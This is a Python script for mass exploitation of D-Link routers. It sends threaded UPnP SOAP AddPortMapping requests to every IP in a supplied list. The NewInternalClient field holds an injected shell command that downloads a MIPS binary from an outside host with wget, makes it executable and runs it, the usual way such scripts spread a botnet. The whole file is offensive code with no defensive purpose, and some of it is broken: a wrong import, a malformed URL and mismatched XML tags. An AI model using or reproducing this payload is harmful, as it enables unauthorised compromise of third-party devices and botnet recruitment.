#! python !#
import threading, sys, time, random, socket, re, os, struct, array, requests, base64, subprocess
from sys import stdout
from Threading import thread
from Queue import *
ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
p1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;wget http:1.1.1.1/bins/mips;chmod 777 *;./mips dlink.exploit/</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>"

headerlist = {'SOAPAction': 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'}


def rtek(host):
    try:
		url = "http://" + host + ":49152/soap.cgi?service=WANIPConn1"
		requests.post(url, timeout=5, headers=headerlist, data=p1)
    except:
        pass
    return

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=rtek, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            sys.exit("Interrupted? (ctrl + c)")
    thread.join()
    return

if __name__ == "__main__":
    main()